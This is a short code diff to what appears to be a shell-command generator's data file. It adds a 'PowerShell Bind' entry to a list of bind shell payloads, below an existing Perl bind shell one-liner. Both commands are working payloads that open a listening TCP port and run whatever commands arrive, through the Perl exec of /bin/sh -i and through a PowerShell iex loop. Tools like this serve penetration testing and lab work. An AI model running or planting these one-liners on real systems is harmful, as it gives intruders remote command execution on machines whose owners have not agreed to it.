@@ -413,6 +413,11 @@ const bindShellCommands =  withCommandType(
             "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
             "meta": ["bind", "mac", "linux"]
         },
+        {
+            "name": "PowerShell Bind",
+            "command": "powershell -nop -c \"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {port}); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$buffer = New-Object byte[] 1024; while(($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0){ $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead); $output = iex $command 2>&1 | Out-String; $response = ([System.Text.Encoding]::ASCII).GetBytes($output); $stream.Write($response, 0, $response.Length); $stream.Flush() }\"",
+            "meta": ["bind", "windows"]
+        }
     ]
 );
 
